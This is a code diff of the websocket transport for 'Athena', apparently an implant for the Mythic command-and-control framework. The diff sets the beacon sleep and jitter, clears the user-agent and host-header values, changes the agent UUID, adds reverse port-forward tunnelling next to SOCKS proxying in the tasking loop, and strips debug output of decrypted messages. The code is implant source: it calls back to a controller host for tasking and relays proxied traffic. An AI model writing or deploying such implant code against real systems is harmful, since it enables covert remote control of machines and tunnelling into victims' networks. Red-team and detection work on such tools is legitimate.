@@ -4,13 +4,13 @@ using System.Text.Json;
 using System.Net.WebSockets;
 using System.Text;
 using Athena.Models.Mythic.Checkin;
-using System.Text.Json.Serialization;
 using System.Diagnostics;
-using Athena.Models.Athena.Commands;
-using Athena.Models.Mythic.Response;
+using Athena.Models.Commands;
 using Athena.Models.Mythic.Tasks;
 using Athena.Commands;
 using Athena.Profiles.Websocket;
+using Athena.Models.Comms.SMB;
+using Athena.Models.Proxy;
 
 namespace Athena
 {
@@ -42,17 +42,15 @@ namespace Athena
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
             this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
-            this.userAgent = "USER_AGENT";
-            this.hostHeader = "%HOSTHEADER%";
-            //this.psk = "rpfZ1fwiz8pXXy33eDYW7bU6iZLjezOhObwqQHy4/cE=";
+            this.userAgent = "";
+            this.hostHeader = "";
             this.psk = "";
             this.encryptedExchangeCheck = bool.Parse("false");
-            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 2;
+            int sleep = int.TryParse("3", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 2;
+            int jitter = int.TryParse("3", out jitter) ? jitter : 10;
             this.jitter = jitter;
-            //this.uuid = "5ccee0dc-7606-4c7b-8940-6f3c6f77d13c";
-            this.uuid = "299c342a-54d2-4e66-9634-ef091dfa3723";
+            this.uuid = "fd050dd6-ed20-45a6-90f5-1ef9d6a1caa6";
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(this.uuid, this.psk);
@@ -74,18 +72,18 @@ namespace Athena
                 await Task.Delay(await Misc.GetSleep(this.sleep, this.jitter) * 1000);
                 Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
                 Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
-                Task<List<SocksMessage>> socksTask = SocksResponseHandler.GetSocksMessagesAsync();
-                await Task.WhenAll(responseTask, delegateTask, socksTask);
-
-                List<string> responses = await responseTask;
+                Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
+                Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
+                await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);
 
                 GetTasking gt = new GetTasking()
                 {
                     action = "get_tasking",
                     tasking_size = -1,
-                    delegates = await delegateTask,
-                    socks = await socksTask,
-                    responses = responses,
+                    delegates = delegateTask.Result,
+                    socks = socksTask.Result,
+                    responses = responseTask.Result,
+                    rpfwd = rpFwdTask.Result,
                 };
                 try
                 {
@@ -186,7 +184,6 @@ namespace Athena
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
-                    Debug.WriteLine($"[{DateTime.Now}] Decrypting and printing message: {this.crypt.Decrypt(json)}");
                 }
                 else
                 {
@@ -201,7 +198,6 @@ namespace Athena
                 };
 
                 string message = JsonSerializer.Serialize(m, WebsocketJsonContext.Default.WebSocketMessage);
-                Debug.WriteLine($"[{DateTime.Now}] Final Message: {message}");
                 byte[] msg = Encoding.UTF8.GetBytes(message);
                 Debug.WriteLine($"[{DateTime.Now}] Sending Message and waiting for resopnse.");
                 await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
